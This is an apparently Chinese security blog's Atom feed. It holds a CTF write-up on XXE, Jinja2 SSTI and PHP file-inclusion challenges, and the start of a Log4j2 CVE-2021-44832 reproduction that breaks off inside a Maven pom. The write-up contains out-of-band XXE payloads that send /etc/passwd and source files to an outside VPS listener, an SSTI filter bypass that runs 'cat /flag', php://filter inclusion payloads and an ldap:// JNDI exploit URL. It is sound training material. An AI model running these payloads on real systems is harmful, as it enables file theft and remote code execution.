<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>greetdawn&#39;s Blog</title>
  
  <subtitle>The God love people</subtitle>
  <link href="http://www.greetdawn.top/atom.xml" rel="self"/>
  
  <link href="http://www.greetdawn.top/"/>
  <updated>2022-02-15T14:34:41.898Z</updated>
  <id>http://www.greetdawn.top/</id>
  
  <author>
    <name>丨greetdawn丨</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctf-wp-saining</title>
    <link href="http://www.greetdawn.top/2022/02/15/ctf-wp-saining/"/>
    <id>http://www.greetdawn.top/2022/02/15/ctf-wp-saining/</id>
    <published>2022-02-15T08:34:16.000Z</published>
    <updated>2022-02-15T14:34:41.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h1><pre class="language-none"><code class="language-none">61.147.171.107:1008161.147.171.107:1008261.147.171.107:10083</code></pre><h1 id="10081-xml注入"><a href="#10081-xml注入" class="headerlink" title="10081 xml注入"></a>10081 xml注入</h1><p>访问源代码分析，感觉应该的是个xml外部实体注入</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png"></p><p>先构造payload试一哈：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>确实存在，但是有过滤</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png" alt="image-20220215220635177"></p><p>尝试使用参数型实体方式注入：</p><p><code>vps</code>构造<code> test.dtd</code></p><pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre><p>开启端口监听：<code>nc -lvvp 8888</code></p><p>攻击payload:</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;139.196.234.164:8899&#x2F;test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png" alt="image-20220215221604181"></p><p>成功返回加密字符串，解密后获取</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png" alt="image-20220215221634222"></p><p>修改<code>test.dtd</code>获取<code>test.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;test.php&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre><p>发包获取到源码如下：</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);function showAttrs($attrs) &#123;    $r &#x3D; [&quot;&quot;];    foreach ($attrs as $k &#x3D;&gt; $v) &#123;        array_push($r, $k . &quot;&#x3D;\&quot;&quot; . $v-&gt;textContent . &quot;\&quot;&quot;);    &#125;    return implode(&quot; &quot;, $r);&#125;function showNode($n, $pre) &#123;    if ($n-&gt;hasChildNodes()) &#123;        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\n&quot;;        foreach ($n-&gt;childNodes as $c) &#123;            show($c, $pre . &quot; &quot;);        &#125;        echo $pre . &quot;&lt;&#x2F;&quot; . $n-&gt;nodeName . &quot;&gt;\n&quot;;    &#125; else &#123;        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&#x2F;&gt;\n&quot;;    &#125;&#125;function show($n, $pre) &#123;    switch ($n-&gt;nodeType) &#123;        case XML_ELEMENT_NODE:            showNode($n, $pre);            break;        case XML_TEXT_NODE:        case XML_CDATA_SECTION_NODE:        case XML_ENTITY_REF_NODE:            echo $pre . $n-&gt;textContent . &quot;\n&quot;;            break;                case XML_COMMENT_NODE:            echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\n&quot;;            break;        case XML_DOCUMENT_NODE:            foreach ($n-&gt;childNodes as $c) &#123;                show($c, $pre);            &#125;            break;        default:        echo &quot;Nope&quot;;            break;    &#125;&#125;if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123;    $d &#x3D; new DOMDocument();    $data &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);    if(preg_match(&#39;&#x2F;file|rot13&#x2F;i&#39;, $data))    &#123;        die(&#39;illegal!&#39;);    &#125;    $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT);    if ($d-&gt;validate()) &#123;        show($d, &quot;&quot;);    &#125; else &#123;        echo &quot;è¿å¥½åä¸æ¯ä¸ªè§èçè¯­å¥å¦&quot;;    &#125;&#125; else &#123;    echo (&quot;è¯·æ±æ¹å¼æè¯¯&quot;);&#125; </code></pre><p>看了一下源码没啥东西</p><p>应该不用源码审计，猜测flag可能存在路径下，修改test.dtd包含一下看看</p><pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.31.79:8888?p&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png" alt="image-20220215222612642"></p><p>确实有值，解密后成功拿到flag</p><pre class="language-none"><code class="language-none">ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png" alt="image-20220215222649524"></p><h2 id="flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb"><a href="#flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb" class="headerlink" title="flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}"></a>flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}</h2><h1 id="10082-ssti模板注入"><a href="#10082-ssti模板注入" class="headerlink" title="10082 ssti模板注入"></a>10082 ssti模板注入</h1><p>请求获取源码，分析源码，获得变量入口点，首先传参变量是name, 构造<code>/?name=&#123;&#123;4*4&#125;&#125;</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png" alt="image-20220215165423675"></p><p>呦西 ，确实有ssti！</p><p>不过存在过滤，几乎把能过滤的东西都过滤了，过滤的死死滴</p><pre class="language-python" data-language="python"><code class="language-python">blackwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token string">'add'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'redirect'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'get_flashed_messages'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token string">'cookies'</span><span class="token punctuation">,</span> <span class="token string">'headers'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">]</span></code></pre><p>那就绕吧，怎么绕呢？</p><p>这里可以利用的点就是使用jinja2自身的过滤器进行bypass</p><pre class="language-none"><code class="language-none">&#123;% set org &#x3D; (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png" alt="image-20220215172249858"></p><p>编写获取对应字符串搜索脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token comment"># author:greetdawn</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://61.147.171.107:10082/?name="</span>payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;% set sstr = ((app.__doc__|string|list).pop(&#123;num&#125;)|string) %&#125;&#125;&#123;&#123;&#123;&#123;sstr&#125;&#125;&#125;&#125;"</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># print(r.text)</span><span class="token keyword">if</span> <span class="token string">'/'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] paylaod: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"search &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>依次获取更多字符</p><pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125; # _&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125; &#123;&#123;left&#125;&#125; # (&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125; &#123;&#123;right&#125;&#125; # )&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125; # 单引号 &#39;&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125; &#123;&#123;point&#125;&#125; # .&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;    # builtins&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;&#123;&#123;imp&#125;&#125; # import&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;&#123;&#123;pon&#125;&#125; # popen&#123;% set os &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;&#123;&#123;os&#125;&#125;    # os&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;    # cat&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;    # flag&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;    # eval&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125; &#123;&#123;red&#125;&#125; # read&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125;    # __builtins__&#123;% set zero &#x3D; (self|int) %&#125;    # 0, 也可以使用lenght过滤器获取数字&#123;% set one &#x3D; (zero**zero)|int %&#125;    # 1&#123;% set two &#x3D; (zero-one-one)|abs %&#125;    # 2&#123;% set four &#x3D; (two*two)|int %&#125;    # 4&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;    # 5&#123;% set three &#x3D; five-one-one %&#125;    # 3&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;    # 9&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;    # 7&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;    # 字符 c&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;    # 百分号 %&#123;% set bfhc &#x3D; bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 &#x2F;</code></pre><p>根据以上获取字符串进行拼接获取<code>payload:``__import__(’os‘).popen(‘cat /flag’).read()</code></p><pre class="language-jinja2" data-language="jinja2"><code class="language-jinja2">http:&#x2F;&#x2F;61.147.171.107:10082&#x2F;?name&#x3D;&#123;% set zero &#x3D; (self|int) %&#125;&#123;% set one &#x3D; (zero**zero)|int %&#125;&#123;% set two &#x3D; (zero-one-one)|abs %&#125;&#123;% set four &#x3D; (two*two)|int %&#125;&#123;% set five &#x3D; (two*two*two)-one-one-one %&#125;&#123;% set three &#x3D; five-one-one %&#125;&#123;% set nine &#x3D; (two*two*two*two-five-one-one) %&#125;&#123;% set seven &#x3D; (zero-one-one-five)|abs %&#125;&#123;% set c &#x3D; dict(c&#x3D;aa)|reverse|first %&#125;&#123;% set bfh &#x3D; self|string|urlencode|first %&#125;&#123;% set bfhc &#x3D; bfh~c %&#125;&#123;% set slas &#x3D; bfhc%((four~seven)|int) %&#125;&#123;% set space &#x3D; ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;% set yin &#x3D; ((app.__doc__|string|list).pop(177)|string) %&#125;&#123;% set xhx &#x3D; ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;% set left &#x3D; ((app.__doc__|string|list).pop(171)|string) %&#125;&#123;% set right &#x3D; ((app.__doc__|string|list).pop(182)|string) %&#125;&#123;% set point &#x3D; ((app.__doc__|string|list).pop(26)|string) %&#125;&#123;% set but &#x3D; dict(buil&#x3D;aa,tins&#x3D;dd)|join %&#125;&#123;% set imp &#x3D; dict(imp&#x3D;aa,ort&#x3D;dd)|join %&#125;&#123;% set pon &#x3D; dict(po&#x3D;aa,pen&#x3D;dd)|join %&#125;&#123;% set exo &#x3D; dict(o&#x3D;aa,s&#x3D;dd)|join %&#125;&#123;% set ca &#x3D; dict(ca&#x3D;aa,t&#x3D;dd)|join %&#125;&#123;% set flg &#x3D; dict(fl&#x3D;aa,ag&#x3D;dd)|join %&#125;&#123;% set ev &#x3D; dict(ev&#x3D;aa,al&#x3D;dd)|join %&#125;&#123;% set red &#x3D; dict(re&#x3D;aa,ad&#x3D;dd)|join %&#125;&#123;% set bul &#x3D; xhx*2~but~xhx*2 %&#125; &#123;% set pld &#x3D; xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;&#123;pld&#125;&#125;</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png" alt="image-20220215215529181"></p><p>带入万能payload构造eval执行命令</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> whoami<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span>         <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> v<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>             <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png" alt="image-20220215215549758"></p><h2 id="flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS"><a href="#flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS" class="headerlink" title="flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}"></a>flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}</h2><h1 id="10083-文件包含"><a href="#10083-文件包含" class="headerlink" title="10083 文件包含"></a>10083 文件包含</h1><p>请求看源码，典型的文件包含，传入变量<code>file1</code>和<code>file2</code></p><p><code>payload：</code></p><pre class="language-php" data-language="php"><code class="language-php">file1<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span>file2<span class="token operator">=</span>data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>hello ctf</code></pre><p>利用data协议传入原始文件流，利用php://filter协议包含flag.php文件源码</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png" alt="image-20220215164654261">成功获取base64值解密得flag</p><pre class="language-php" data-language="php"><code class="language-php"> PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"WRONG WAY!"</span><span class="token punctuation">;</span><span class="token comment">// $flag = flag&#123;1nlude_and_g0T_1T!&#125;</span></span></code></pre><h2 id="flag-flag-1nlude-and-g0T-1T"><a href="#flag-flag-1nlude-and-g0T-1T" class="headerlink" title="flag: flag{1nlude_and_g0T_1T!}"></a><code>flag: flag&#123;1nlude_and_g0T_1T!&#125;</code></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境地址&quot;&gt;&lt;a href=&quot;#环境地址&quot; class=&quot;headerlink&quot; title=&quot;环境地址&quot;&gt;&lt;/a&gt;环境地址&lt;/h1&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;61.147.171</summary>
      
    
    
    
    <category term="安全竞赛" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="面试题" scheme="http://www.greetdawn.top/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2基于JDBCAPPENDER配置文件任意文件执行(CVE-2021-44832)</title>
    <link href="http://www.greetdawn.top/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/"/>
    <id>http://www.greetdawn.top/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/</id>
    <published>2021-12-29T02:34:17.000Z</published>
    <updated>2021-12-29T03:51:47.528Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前期<code>log4j2</code>存在的远程代码执行漏洞<code>（CVE-2021-44228）</code>引起了轩然大波。昨天上网冲浪发现，<code>checkmark</code>研究员<code>YANIV NIZRY</code>公布了新版本<code>log4j2 2.17.0</code>中存在基于<code>JDBCAPPENDER</code>配置文件的任意命令执行。且该漏洞已经公布其<code>CVE</code>编号为<code>CVE-2021-44832</code>。</p></blockquote><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><code>log4j2</code>在进行<code>JDBC</code>反序列化之前，可以通过<code>JNDI</code>动态远程获取数据库源文件。官方配置文档的格式如下：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>JDBC</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseAppender<span class="token punctuation">"</span></span> <span class="token attr-name">tableName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dbo.application_log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java:/comp/env/jdbc/LoggingDataSource<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> &lt;Column ...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>JDBC</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>…<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span></code></pre><p>这里可以尝试控制任意<code>LDAP</code>的<code>URL</code>,而达成对应的利用。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ldap://127.0.0.1:1389/Exploit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><h1 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h1><p>本地获取<code>2.17.0</code>版本<code>log4j2</code></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-rce<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.17.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.17.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--        &lt;dependency>--></span><span class="token comment">&lt;!--            